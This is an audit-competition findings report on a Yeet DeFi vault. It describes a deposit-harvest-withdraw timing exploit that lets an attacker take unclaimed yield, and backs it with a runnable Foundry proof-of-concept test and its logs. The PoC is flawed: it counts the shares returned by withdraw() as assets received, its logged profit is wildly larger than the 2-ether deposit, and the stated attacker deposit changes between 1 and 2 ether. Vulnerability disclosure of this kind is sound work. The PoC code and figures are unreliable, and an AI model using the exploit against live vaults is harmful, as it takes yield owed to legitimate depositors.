# Yeet: Gamified DeFi protocol - Findings Report

## Table of contents
- ### Medium Risk Findings
    - #### M-01. Harvest timing exploit enables theft of unclaimed yield

# <a id='contest-summary'></a>Contest Summary

[See more contest details here](https://immunefi.com/audit-competition/audit-comp-yeet/leaderboard/#top)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- Medium: 1

# Medium Risk Findings

## <a id='M-01'></a>M-01. Harvest timing exploit enables theft of unclaimed yield
### Brief/Intro

A timing gap in the harvest mechanism of the MoneyBrinter vault allows an attacker to deposit funds at a discounted share price and subsequently withdraw at an elevated share price after unclaimed yield is harvested, effectively enabling the theft of unclaimed yield.

This allows the attacker to profit without providing any long-term liquidity.

The vulnerability could result in significant loss of yield for legitimate depositors, undermining the fairness and efficiency of the protocol.

---

## Vulnerability Details

The vulnerability arises because the MoneyBrinter vault’s deposit and share-minting process is based solely on the vault’s current asset balance, which does not yet include pending rewards nor is there any delay mechanism in place to disallow users to deposit and then withdraw immediately.

When rewards from underlying yield sources (e.g., Beradrome rewards) are accrued, they remain “unharvested” until an explicit harvest operation is performed.

This means that new deposits occurring just before a harvest receive shares calculated at a lower asset value than the eventual post-harvest balance.

An attacker can exploit this timing gap by depositing funds immediately before a harvest - receiving shares at a current price, then triggering the harvest to update the vault’s asset balance, which increases share price, and then withdrawing immediately.

For example, if a legitimate user deposits 10 ether and accrues an additional 1 ether of yield (unharvested), an attacker depositing 1 ether just before the harvest will receive shares at the lower pre-harvest rate. Once the harvest occurs and the vault’s balance increases, the attacker can withdraw their funds at the higher share price, thereby capturing the difference as profit.

---

## Impact Details

The long-term impact is this: imagine some long-term legitimate depositors left their funds to accumulate rewards. An attacker can deposit-havest-withdraw immediately and as a result, get yield without practically committing any funds.

Exploitation of this vulnerability results in the theft of unclaimed yield, leading to a significant and permanent loss of rewards for legitimate depositors.

---

## References

Harvest functions: https://github.com/immunefi-team/audit-comp-yeet/blob/main/src/contracts/MoneyBrinter.sol#L159-L185  
totalAssets function: https://github.com/immunefi-team/audit-comp-yeet/blob/main/src/contracts/MoneyBrinter.sol#L138-L140  
From comments in the code:

Rewards can be harvested by anyone. xKDK Rewards can be optionally allocated to Kodiak Rewards Module to harvest more rewards. While compounding, the vault zaps in using the zapper to get island tokens(underling vault asset) and reinvests that into the beradrome farm. The zapper swaps the reward tokens for wBera and Yeet, then mints island tokens and sends them to the vault. It also returns any unused yeet and Wbera to the vault.

---

## Proof of Concept

### Proof of Concept

Below is a simple simulated scenario:

#### Setup

Bob deposits 10 ether into the vault, setting the baseline. Then, 1 ether of extra yield is accrued but left unclaimed. At this point the share price is the same.

#### Attack

An attacker deposits 2 ether, getting shares at the current pre-harvest price.  
A harvest is triggered that adds the 1 ether of unclaimed yield to the vault balance.  
Attacker immediately withdraws their shares, resulting in an immediate profit.

Here's a runnable POC that simulates the scenario described above. Add this is the VaultDepositTest.t.sol file:

```solidity
function simulateVaultProfit(uint256 amount, bool isPositive) internal {
        if (amount == 0) return;
        if (isPositive) {
            // Mint additional "yield" tokens directly to the vault.
            ERC20Mock(address(asset)).mint(address(vault), amount);
            // Ensure owner has tokens so that depositFor can transfer them.
            ERC20Mock(address(asset)).mint(owner, amount);
            // Approve the farmPlugin to spend tokens from owner.
            vm.prank(owner);
            IERC20(asset).approve(address(farmPlugin), amount);
            // Call depositFor with the vault as the receiver.
            vm.prank(owner); 
            farmPlugin.depositFor(address(vault), amount);
        } else {
            uint256 bal = farmPlugin.balanceOf(address(vault));
            vm.prank(owner);
            farmPlugin.withdrawTo(bob, amount);
        }
    }

function simulateHarvest(uint256 amount) internal {
        if (amount == 0) return;
        ERC20Mock(address(asset)).mint(address(vault), amount);
        ERC20Mock(address(asset)).mint(owner, amount);
        vm.prank(owner);
        IERC20(asset).approve(address(farmPlugin), amount);
        vm.prank(owner);
        farmPlugin.depositFor(address(vault), amount);
}

function _getVaultData() internal view returns (VaultData memory) {
        return VaultData({
            totalAssets: IERC4626(vault).totalAssets(),
            totalShares: IERC4626(vault).totalSupply()
        });
}

function testRewardExploit() public {
        uint256 depositAmount = 10 ether;
        uint256 expectedShares = vault.previewDeposit(depositAmount);
        fundUser(bob, depositAmount);
        approveToVault(bob, depositAmount);
        depositIntoVaultAndVerify(bob, depositAmount, expectedShares, true, "");

        uint256 simulatedProfit = 1 ether;
        simulateVaultProfit(simulatedProfit, true);

        VaultData memory preState = _getVaultData();
        require(preState.totalShares > 0, "No shares minted");
        console.log("Total shares:", preState.totalShares);
        console.log("Total assets:", preState.totalAssets);
        uint256 preSharePrice = preState.totalAssets * 1e18/ preState.totalShares;
        console.log("Pre-harvest share price:", preSharePrice);

        address attacker = address(0xABC);
        uint256 attackerDeposit = 2 ether;
        fundUser(attacker, attackerDeposit);
        approveToVault(attacker, attackerDeposit);
        uint256 attackerExpectedShares = vault.previewDeposit(attackerDeposit);
        depositIntoVaultAndVerify(attacker, attackerDeposit, attackerExpectedShares, true, "");

        uint256 attackerSharesAfterDeposit = IERC4626(vault).balanceOf(attacker);
        console.log("Attacker shares after deposit:", attackerSharesAfterDeposit);

        uint256 simulatedHarvestAmount = 1 ether;
        simulateHarvest(simulatedHarvestAmount);

        VaultData memory postState = _getVaultData();
        require(postState.totalShares > 0, "No shares after harvest");
        uint256 postSharePrice = postState.totalAssets * 1e18 / postState.totalShares;
        console.log("Post-harvest share price:", postSharePrice);

        assertGt(postSharePrice, preSharePrice, "Share price did not increase after harvest");

        vm.prank(attacker);
        uint256 withdrawnAssets = IERC4626(vault).withdraw(attackerDeposit, attacker, attacker);

        uint256 profit = withdrawnAssets > attackerDeposit ? withdrawnAssets - attackerDeposit : 0;
        console.log("Attacker profit from exploit:", profit);

        assertGt(profit, 0, "Attacker did not profit from frontrunning the harvest");
}
```

Also add this line in the `VaultUnitTest.t.sol` file in the `initializeVault()` so we can use farmPlugin here:

```solidity
farmPlugin = _farmPlugin;
```

Then run with:

```
forge test --match-test testRewardExploit -vvv
```

**Result:**

```
Logs:
  Total shares: 1000000000000000000000000
  Total assets: 11000000000000000000
  Pre-harvest share price: 11000000000000
  Attacker shares after deposit: 181818181818181818183471
  Post-harvest share price: 11846153846153
  Attacker profit from exploit: 168829168831168831171294
```
